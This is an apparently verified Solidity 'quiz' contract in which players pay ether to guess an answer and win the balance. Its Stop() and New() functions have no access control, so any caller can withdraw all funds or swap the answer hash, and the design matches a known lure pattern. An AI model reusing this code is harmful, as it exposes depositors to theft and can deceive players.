/**
 *Submitted for verification at Etherscan.io on 2020-02-04
*/

pragma solidity ^0.4.25;

contract N_quiz {
    function Try(string _response) external payable {
        require(msg.sender == tx.origin, "You're not the origin of the Tx");

        if (responseHash == keccak256(_response) && msg.value > 0.00001 ether) {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    bytes32 responseHash;

    function Start(string _question, string _response) public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable {
        msg.sender.transfer(this.balance);
    }

    function New(string _question, bytes32 _responseHash) public payable {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() public {}

    function() public payable {}
}
